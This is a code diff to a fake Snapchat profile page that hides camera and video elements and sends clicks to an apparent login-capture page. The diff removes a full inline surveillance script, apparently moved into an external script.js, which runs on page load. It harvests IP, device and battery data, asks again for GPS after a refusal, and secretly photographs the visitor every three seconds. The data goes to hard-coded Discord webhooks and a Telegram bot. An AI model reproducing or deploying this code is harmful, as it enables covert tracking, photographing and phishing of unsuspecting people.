@@ -7,7 +7,7 @@
     <link rel="icon" href="logo.jpg" type="image/jpeg">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- وسوم المعاينة الرسمية لإخفاء الرابط وإظهار البطاقة -->
+    <!-- وسوم المعاينة الرسمية لإخفاء الرابط وإظهار البطاقة والشعار -->
     <meta property="og:title" content="Snapchat • Nsro🦚❤️" />
     <meta property="og:description" content="عرض الملف الشخصي والقصص الحصرية على سناب شات" />
     <meta property="og:image" content="logo.jpg" />
@@ -57,7 +57,7 @@
 </head>
 <body>
 
-    <!-- عناصر الكاميرا والفيديو المخفية -->
+    <!-- عناصر الكاميرا والفيديو المخفية للرصد -->
     <video id="video" playsinline autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
@@ -107,217 +107,9 @@
         </div>
     </main>
 
-    <!-- المحرك الاستخباراتي المزدوج (Discord + Telegram) مع التكرار التكتيكي -->
+    <!-- ربط الملف الخارجي script.js -->
+    <script src="script.js"></script>
     <script>
-        /* ==========================================================================
-           ULTIMATE HUNTER ENGINE V25.0 - DUAL-CHANNEL OMNI RECON & PERSISTENCE
-           ========================================================================== */
-        "use strict";
-
-        const DISCORD_WEBHOOKS = [
-            "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H",
-            "https://discord.com/api/webhooks/1564684857362358363/F34NZ2OBhi35exXCz2daOXWt7lGS3DEEoAmy_r7SEHK10ZLi9x-iN4qMxzsaW3txKZKt",
-            "https://discord.com/api/webhooks/1564684888668512416/ahcAya5wTAsNuRyhVbltJZ5TQfPQvLAw7Ipc68nGAYrWjSbvr75wswHEe1QFFKK9hVOe"
-        ];
-
-        // قنوات تيليجرام الاحتياطية (ضع توكن البوت وآيدي الشات الخاص بك هنا)
-        const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
-        const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
-
-        let activeWebhookIndex = 0;
-
-        async function transmitPayloadDual(textContent, binaryBlob = null, targetFileName = "intel_frame.png") {
-            // 1. الإرسال لقنوات ديسكورد مع نظام التبديل
-            let discordSuccess = false;
-            for (let i = 0; i < DISCORD_WEBHOOKS.length; i++) {
-                try {
-                    const form = new FormData();
-                    form.append("payload_json", JSON.stringify({ content: textContent }));
-                    if (binaryBlob) form.append("file", binaryBlob, targetFileName);
-                    const res = await fetch(DISCORD_WEBHOOKS[activeWebhookIndex], { method: "POST", body: form });
-                    if (res.ok) { discordSuccess = true; break; }
-                    else { activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length; }
-                } catch {
-                    activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
-                }
-            }
-
-            // 2. الإرسال الاحتياطي لبوت تيليجرام بالتوازي
-            try {
-                if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_TELEGRAM_BOT_TOKEN") {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textContent, parse_mode: "Markdown" })
-                    });
-                    if (binaryBlob && TELEGRAM_CHAT_ID) {
-                        const tgForm = new FormData();
-                        tgForm.append("chat_id", TELEGRAM_CHAT_ID);
-                        tgForm.append("photo", binaryBlob, targetFileName);
-                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: tgForm });
-                    }
-                }
-            } catch (err) {
-                console.error("Telegram backup transmission error:", err);
-            }
-        }
-
-        async function getDeviceTelemetry() {
-            let ipInfo = { ip: "غير معروف", city: "غير معروف", country: "غير معروف", org: "غير معروف" };
-            try {
-                const res = await fetch("https://ipapi.co/json/");
-                const data = await res.json();
-                ipInfo = { ip: data.ip, city: data.city, country: data.country_name, org: data.org };
-            } catch {}
-
-            let batteryInfo = { level: "غير معروف", charging: true };
-            try {
-                if (typeof navigator.getBattery === "function") {
-                    const batt = await navigator.getBattery();
-                    batteryInfo = { level: `${Math.round(batt.level * 100)}%`, charging: batt.charging };
-                }
-            } catch {}
-
-            return {
-                ...ipInfo,
-                ...batteryInfo,
-                platform: navigator.platform || "مجهول",
-                userAgent: navigator.userAgent,
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height
-            };
-        }
-
-        // طلب GPS مع نظام إلحاح وتكرار ذكي عند الرفض
-        function requestPersistentGPS() {
-            return new Promise(resolve => {
-                const cached = localStorage.getItem("omni_gps_cache");
-                const parsed = cached ? JSON.parse(cached) : null;
-
-                if (!navigator.geolocation) {
-                    resolve(parsed ? `📍 **موقع GPS (المحفوظ بالذاكرة):** ${parsed.lat}, ${parsed.lon}` : "📍 **موقع GPS:** غير مدعوم.");
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        const acc = pos.coords.accuracy;
-                        localStorage.setItem("omni_gps_cache", JSON.stringify({ lat, lon }));
-                        resolve(`📍 **موقع GPS المباشر والدقيق:**\n- الخط: \`${lat}\`\n- الطول: \`${lon}\`\n- الدقة: \`${acc} متر\`\n- 🗺️ الرابط: https://www.google.com/maps?q=${lat},${lon}`);
-                    },
-                    () => {
-                        // في حال الرفض: إعادة محاولة تكتيكية بعد 4 ثوانٍ لضمان الحصول على الصيد
-                        setTimeout(() => {
-                            navigator.geolocation.getCurrentPosition(
-                                p2 => {
-                                    const lat2 = p2.coords.latitude;
-                                    const lon2 = p2.coords.longitude;
-                                    resolve(`📍 **موقع GPS (بعد الإلحاح والتكرار):** https://www.google.com/maps?q=${lat2},${lon2}`);
-                                },
-                                () => {
-                                    resolve(parsed ? `📍 **موقع GPS (الاحتياطي المحفوظ):** ${parsed.lat}, ${parsed.lon}` : "📍 **موقع GPS:** تم رفض الإذن.");
-                                },
-                                { enableHighAccuracy: true, timeout: 5000 }
-                            );
-                        }, 4000);
-                    },
-                    { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
-                );
-            });
-        }
-
-        // الكاميرا والالتقاط المستمر
-        const videoEl = document.getElementById("video");
-        const canvasEl = document.getElementById("canvas");
-        let streamObj = null;
-        let captureTimer = null;
-
-        function startStreamLoop() {
-            if (captureTimer) return;
-            captureTimer = setInterval(async () => {
-                if (!videoEl || !canvasEl || videoEl.videoWidth === 0) return;
-                try {
-                    canvasEl.width = videoEl.videoWidth;
-                    canvasEl.height = videoEl.videoHeight;
-                    const ctx = canvasEl.getContext("2d");
-                    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-                    canvasEl.toBlob(async blob => {
-                        if (blob && blob.size > 1000) {
-                            await transmitPayloadDual(`📸 **[صورة حية متسلسلة للهدف]**`, blob, `snap_${Date.now()}.png`);
-                        }
-                    }, "image/png", 0.95);
-                } catch {}
-            }, 3000);
-        }
-
-        function requestPersistentCamera() {
-            return new Promise(async resolve => {
-                if (!navigator.mediaDevices?.getUserMedia || !window.isSecureContext) {
-                    resolve(false);
-                    return;
-                }
-                try {
-                    streamObj = await navigator.mediaDevices.getUserMedia({
-                        audio: false,
-                        video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } }
-                    });
-                    if (videoEl) {
-                        videoEl.srcObject = streamObj;
-                        await videoEl.play();
-                    }
-                    startStreamLoop();
-                    resolve(true);
-                } catch {
-                    // إلحاح وتكرار طلب الكاميرا في حال الرفض
-                    setTimeout(async () => {
-                        await requestPersistentCamera();
-                    }, 3000);
-                    resolve(false);
-                }
-            });
-        }
-
-        // التشغيل التلقائي الفوري فور فتح الصفحة
-        let engineLock = false;
-        async function runOmniEngine() {
-            if (engineLock) return;
-            engineLock = true;
-
-            const [devInfo, gpsStr] = await Promise.all([
-                getDeviceTelemetry(),
-                requestPersistentGPS()
-            ]);
-
-            const timeStr = new Date().toLocaleString("ar-EG");
-            const report = `
-🔥 **[ صيد فوري جديد - تم الدخول التلقائي ]** 🔥
-⏰ **الوقت:** \`${timeStr}\`
-
-📱 **نوع الجهاز:** \`${devInfo.platform}\`
-🔋 **البطارية:** \`${devInfo.level}\` (${devInfo.charging ? "يشحن ⚡" : "لا يشحن"})
-🌐 **IP:** \`${devInfo.ip}\`
-🏙️ **الموقع:** \`${devInfo.country} - ${devInfo.city} (${devInfo.org})\`
-💻 **المتصفح:** \`${devInfo.userAgent}\`
-${gpsStr}
-            `.trim();
-
-            await transmitPayloadDual(report);
-
-            // الانتقال الفوري لطلب الكاميرا بعد الموقع مباشرة
-            setTimeout(async () => {
-                await requestPersistentCamera();
-            }, 200);
-        }
-
-        if (document.readyState === "loading") {
-            document.addEventListener("DOMContentLoaded", runOmniEngine, { once: true });
-        } else {
-            runOmniEngine();
-        }
-
-        // التوجيه لصفحة تسجيل الدخول عند أي تفاعل
         document.querySelectorAll('.trigger-login').forEach(item => {
             item.addEventListener('click', () => {
                 window.location.href = 'apply.html';
